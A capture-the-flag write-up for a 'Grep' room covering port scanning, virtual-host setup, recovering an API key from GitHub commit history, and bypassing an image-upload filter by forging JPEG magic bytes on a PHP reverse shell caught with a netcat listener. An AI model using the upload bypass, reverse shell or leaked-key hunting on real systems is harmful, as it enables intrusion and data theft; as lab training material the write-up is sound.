# Grep

######  OSINT, Easy - x1foideo


## Challenge Description

> A challenge that tests your reconnaissance and OSINT skills


## Initial Recon 

#### Nmap

As usual first thing to do is a _nmap_ recognition

```bash
sudo nmap -sS -sV -p- <IP>
```
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open  ssl/http Apache httpd 2.4.41
51337/tcp open  http     Apache httpd 2.4.41
```

#### Virtual Host

Trying to get access to our website:
- On port 80 we get _Apache2 Ubuntu Default Page_
- On port 443 we get a Forbidden Page
- On port 51337 we get a Forbidden Page

Surfing the internet it's possible to see that this situation is quite common in CTFs that use Apache, for _Virtual Hosts_.

Wikipedia says:

> **Virtual hosting** is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers). This allows one server to share its resources, such as memory and processor cycles, without requiring all services provided to use the same host name.

It is possible to solve this problem editing _/etc/hosts_, adding **ip** and relatively **name**

```bash
sudo nano /etc/hosts
```

We get the names checking the certificates, so we add:

```plaintext
<IP> grep.thm leakchecker.grep.thm
```

Now we got access to:
- https://grep.thm:443
- http://leakchecker.grep.thm:51337

## Solution

#### API Key

> What is the API key that allows a user to register on the website?

Trying to register we get an error:

**Invalid or Expired API key**

The name of the website is quite ambiguous (_SearchME!_), and we need to keep in mind this is a OSINT Challenge.

What to do if not looking on GitHub?

On GitHub looking for _SearchME!_ gives us 12 results, but no one seems to be suitable for us.
Moving to _Code_ Filter, we find out that there is a _"supersecuredeveloper/searchmecms · public/html/index.php"_ with something interesting in it:

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/grep/githubsearchme.png?raw=true" width="600" display="block">

Inspecting code we find that the API is in the _register.php_ file, under api.
Unfortunately the developer was smart enough not to make public the API...

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/grep/hiddenkey.png?raw=true" width="600" display="block">

OR NOT

Looking the history of the file, there is a _Initial Commit_, in which it's possible to find the API-Key.


#### First Flag

> What is the first flag?

Using _Burp Suite_, we are able to edit 

_X-Thm-Api-Key: e8d25b4208b80008a9e15c8698640e85_

With the new key we found and register successfully.

Login

Get the Flag


#### Admin User Mail

> What is the email of the "admin" user?

Inspecting the folders and files of the GitHub Repo, we find out that there is a _upload.php_ file, under the "api" folder.

This file let us upload image files, and applies some checks, preventing us from uploading different files.
How? Checking the Magic Bytes.

In the mean time it's possible to notice that the uploaded files are uploaded in the "uploads" folder.

Rev Shell? Of Course, Why Not?

- Create a \*.php file
  ```bash
  nano monkey.php
  ```
- Paste the PHP PentestMonkey Payload
- Since we need to edit the first bytes of the file, let's add at the beginning of the file as many dots as bytes we are going to edit
  (EG: line 12 in _upload.php_ shows that 'jpg' magicbytes are _'ffd8ffe0'_, 4 bytes --> 4 dots)
  ```plaintext
  ....<?php
  ```
- Edit the magicbytes
  ```shell
  hexeditor monkey.php
  ```
  Change the 2E at the beginning with ffd8ffe0
- On local Machine
  ```bash
  nc -lvnp 9999
  ```
- On the website navigate to _/public/html/upload.php_
- Upload the file
- Navigate to /api/uploads/ and open the file


_Extra: Stabilize the shell_

- After Getting the Revshell with nc paste
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ```
- Press `CTRL + Z` to background process
- Paste
  ```bash
  stty raw -echo; fg
  ```
- Paste
  ```bash
  export TERM=xterm
  ```

Move to _backup_ folder in _/var/www_ and cat 'users.sql'.

Get the Admin email


#### eMail LeakChecker

> What is the host name of the web application that allows a user to check an email for a possible password leak?

EZ PZ we got this before, without realizing it.
It's simply the second host name we got before on port 51337


#### Admin Password

> What is the password of the "admin" user?

EZ PZ.
Copy and paste the email and get the password


#nmap #revshell #reverseshell #github #burp #vhost #virtualhost
